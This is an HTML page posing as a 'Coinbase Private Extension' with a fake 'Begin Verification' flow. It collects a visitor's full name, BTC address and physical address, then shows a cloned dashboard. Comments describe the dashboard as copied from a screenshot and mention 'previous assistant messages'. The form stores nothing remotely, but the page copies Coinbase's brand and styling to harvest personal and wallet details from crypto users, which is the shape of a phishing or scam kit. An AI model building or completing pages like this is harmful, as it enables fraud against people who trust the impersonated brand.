<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
  <title>Coinbase Private Extension</title>
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <meta name="description" content="Coinbase Private Extension Dashboard">
  <meta name="theme-color" content="#101114">
  <link rel="icon" href="favicon.ico" type="image/x-icon">
  <link rel="manifest" href="manifest.json">
  <style>
    :root {
      --sidebar-bg: #16181f;
      --sidebar-active: #0052ff;
      --sidebar-icon: #8e93a8;
      --sidebar-hover: #23263a;
      --main-bg: #101114;
      --table-bg: #181a20;
      --border: #22242c;
      --primary: #0052ff;
      --success: #22b573;
      --error: #e74c3c;
      --white: #fff;
      --text: #e8eaf0;
      --subtext: #8e93a8;
      --accent: #3686ff;
      --row-hover: #181a2a;
      --verified: #4ecdc4;
    }
    body {
      margin: 0; padding: 0;
      font-family: 'Segoe UI', Arial, sans-serif;
      background: var(--main-bg);
      color: var(--text);
      min-height: 100vh;
      transition: background 0.35s, color 0.35s;
    }
    [data-theme="light"] {
      --sidebar-bg: #fff;
      --sidebar-active: #0052ff;
      --sidebar-icon: #374151;
      --sidebar-hover: #f0f2f8;
      --main-bg: #f8fafc;
      --table-bg: #fff;
      --border: #e5e7eb;
      --primary: #0052ff;
      --success: #22b573;
      --error: #e74c3c;
      --white: #fff;
      --text: #23263a;
      --subtext: #555;
      --accent: #0052ff;
      --row-hover: #f0f2f8;
      --verified: #22b573;
    }
    .app-container {
      display: flex;
      min-height: 100vh;
      width: 100vw;
    }
    .centered-screen {
      min-height: 100vh;
      display: flex;
      flex-direction: column;
      align-items: center;
      justify-content: center;
      background: var(--main-bg);
      padding: 0;
    }
    .start-image {
      width: 320px;
      max-width: 90vw;
      border-radius: 18px;
      box-shadow: 0 4px 24px rgba(44,62,80,0.2);
      margin-bottom: 32px;
    }
    .main-btn {
      background: var(--primary);
      color: #fff;
      border: none;
      border-radius: 9px;
      font-size: 1.22em;
      font-weight: 600;
      padding: 15px 40px;
      cursor: pointer;
      transition: background 0.2s;
      box-shadow: 0 2px 8px rgba(0,82,255,0.14);
      margin-bottom: 10px;
    }
    .main-btn:active, .main-btn.active {
      background: #0037b3;
    }
    /* Modal Styles */
    .modal-overlay {
      position: fixed;
      top: 0; left: 0; right: 0; bottom: 0;
      background: rgba(26,29,41,0.74);
      display: none;
      align-items: center;
      justify-content: center;
      z-index: 200;
      animation: fadeIn 0.3s;
    }
    .modal-content {
      background: var(--table-bg);
      color: var(--text);
      border-radius: 17px;
      box-shadow: 0 12px 48px rgba(0,0,0,0.24);
      padding: 34px 21px 28px;
      width: 95vw;
      max-width: 380px;
      min-width: 0;
      box-sizing: border-box;
      text-align: center;
      position: relative;
      transition: background 0.3s, color 0.3s;
    }
    .modal-close-btn {
      position: absolute;
      right: 22px;
      top: 18px;
      background: none;
      border: none;
      color: var(--subtext);
      font-size: 1.4em;
      cursor: pointer;
    }
    .modal-content label { text-align: left; display: block; font-weight: 500; margin-bottom: 7px;}
    .modal-content input, .modal-content select {
      width: 100%;
      padding: 11px 12px;
      font-size: 1em;
      margin: 0 0 16px 0;
      border: 1.5px solid var(--border);
      border-radius: 7px;
      background: var(--main-bg);
      color: var(--text);
      outline: none;
      transition: border 0.2s;
    }
    .modal-content input:focus, .modal-content select:focus {
      border: 1.5px solid var(--primary);
    }
    .modal-continue-btn {
      width: 100%;
      background: var(--primary);
      color: #fff;
      font-size: 1.08em;
      border: none;
      border-radius: 7px;
      padding: 13px 0;
      cursor: pointer;
      font-weight: 600;
      margin-top: 4px;
      transition: background 0.19s;
    }
    .modal-continue-btn:active {
      background: #0037b3;
    }
    .modal-error {
      color: var(--error);
      font-size: 0.97em;
      margin: 8px 0;
      display: none;
    }
    /* Welcome Animation */
    .welcome-anim {
      position: fixed;
      top: 0;left: 0;right: 0;bottom: 0;
      background: rgba(16,17,20,0.92);
      color: #fff;
      z-index: 999;
      display: flex;
      align-items: center;
      justify-content: center;
      font-size: 2.1em;
      font-weight: 700;
      letter-spacing: 0.04em;
      opacity: 0;
      pointer-events: none;
      transition: opacity 0.35s;
    }
    .welcome-anim.active { opacity: 1; pointer-events: all;}
    /* Dashboard Clone */
    .dashboard-container { display: none; }
    .dashboard-show { display: flex !important; }
    /* Responsive */
    @media (max-width: 850px) {
      .dashboard-header, .tab-row, .table-section, .balance-block { margin-left: 0 !important; margin-right: 0 !important;}
      .dashboard-header {padding: 22px 14px 0 14px;}
      .tab-row {margin: 28px 0 0 14px;}
      .table-section {margin: 24px 0 0 0;}
    }
    @media (max-width: 650px) {
      .main-content {padding: 0;}
      .dashboard-header {padding: 13px 4vw 0 4vw;}
      .tab-row {margin: 23px 0 0 4vw;}
      .table-section {margin: 17px 0 0 0;}
      .balance-block {font-size: 1.5em;}
    }
    [data-theme="light"] .modal-overlay {background: rgba(245,245,247,0.93);}
    [data-theme="light"] .modal-content {background: #fff; color: #23263a;}
    [data-theme="light"] .welcome-anim {background: rgba(255,255,255,0.97); color: #23263a;}
  </style>
</head>
<body data-theme="dark">
  <div id="startScreen" class="centered-screen">
    <!-- Main image for upload (replace src below with your image file) -->
    <img id="mainImage" class="start-image" src="IMG-20250727-WA0021.jpg" alt="Main" />
    <button class="main-btn" id="beginVerificationBtn">Begin Verification</button>
  </div>
  <!-- Verification Modal Sequence -->
  <div class="modal-overlay" id="modal1">
    <div class="modal-content">
      <button class="modal-close-btn" onclick="closeModal('modal1')">&times;</button>
      <div style="font-size:2.2em;margin-bottom:10px;">ðŸ‡ºðŸ‡¸</div>
      <div style="font-weight:600;font-size:1.18em;margin-bottom:11px;">Confirm your country</div>
      <div style="color: #767676; font-size: 1em; margin-bottom:17px;">United States</div>
      <button class="modal-continue-btn" onclick="showModal('modal2')">Continue</button>
    </div>
  </div>
  <div class="modal-overlay" id="modal2">
    <div class="modal-content">
      <button class="modal-close-btn" onclick="closeModal('modal2')">&times;</button>
      <form id="verifyForm" autocomplete="off">
        <label for="fullName">Full Name</label>
        <input id="fullName" name="fullName" type="text" required placeholder="Enter your full name" />
        <label for="btcAddress">BTC Address</label>
        <input id="btcAddress" name="btcAddress" type="text" required placeholder="Enter your BTC Address" />
        <label for="userAddress">Your Address</label>
        <input id="userAddress" name="userAddress" type="text" required placeholder="Enter your physical address" />
        <div id="verifyError" class="modal-error"></div>
        <button class="modal-continue-btn" type="submit">Continue</button>
      </form>
    </div>
  </div>
  <!-- Welcome Animation -->
  <div class="welcome-anim" id="welcomeAnim">Welcome to COINBASE PRIVATE EXTENSION</div>
  <!-- Dashboard Clone (from your image) -->
  <div class="dashboard-container" id="dashboardContainer">
    <!-- Insert the full cloned dashboard code here (see previous assistant messages for the structure) -->
    <!-- For demo, here's a placeholder with an IMG element to upload the dashboard image -->
    <img id="dashboardImage" src="YOUR_DASHBOARD_IMAGE.jpg" alt="Dashboard" style="width:100vw;max-width:100%;display:block;margin:0 auto;">
    <!-- Place your functional dashboard HTML/CSS/JS here, replacing the above IMG as needed -->
    <!-- Add interactive sections: Sell, Assets, User ID, Verified Badge, etc., all matching the dashboard style -->
  </div>
  <script>
    // Dark/light mode toggle (add your toggle button and logic as needed)
    function setTheme(theme) {
      document.body.setAttribute('data-theme', theme);
      localStorage.setItem('cb-theme', theme);
    }
    setTheme(localStorage.getItem('cb-theme') || 'dark');
    // Start: show first image and Begin Verification
    document.getElementById('beginVerificationBtn').onclick = function() {
      document.getElementById('modal1').style.display = "flex";
    };
    function closeModal(id) { document.getElementById(id).style.display = "none"; }
    function showModal(id) {
      // Hide all modals
      document.querySelectorAll('.modal-overlay').forEach(m => m.style.display = "none");
      document.getElementById(id).style.display = "flex";
    }
    // Modal1: Continue to Modal2
    // Modal2: Verification Form
    document.getElementById('verifyForm').onsubmit = function(e) {
      e.preventDefault();
      var name = document.getElementById('fullName').value.trim();
      var btc = document.getElementById('btcAddress').value.trim();
      var addr = document.getElementById('userAddress').value.trim();
      var error = document.getElementById('verifyError');
      if (!name || !btc || !addr) {
        error.style.display = "block";
        error.textContent = "Please fill in all fields.";
        return false;
      }
      error.style.display = "none";
      closeModal('modal2');
      // Welcome Animation
      let welcome = document.getElementById('welcomeAnim');
      welcome.classList.add('active');
      setTimeout(function() {
        welcome.classList.remove('active');
        document.getElementById('startScreen').style.display = "none";
        document.getElementById('dashboardContainer').classList.add('dashboard-show');
      }, 2000);
      // Prevent repeat
      localStorage.setItem('cb-welcome', '1');
      return false;
    };
    // If already verified, skip to dashboard
    if (localStorage.getItem('cb-welcome')) {
      document.getElementById('startScreen').style.display = "none";
      document.getElementById('dashboardContainer').classList.add('dashboard-show');
    }
  </script>
</body>
</html>
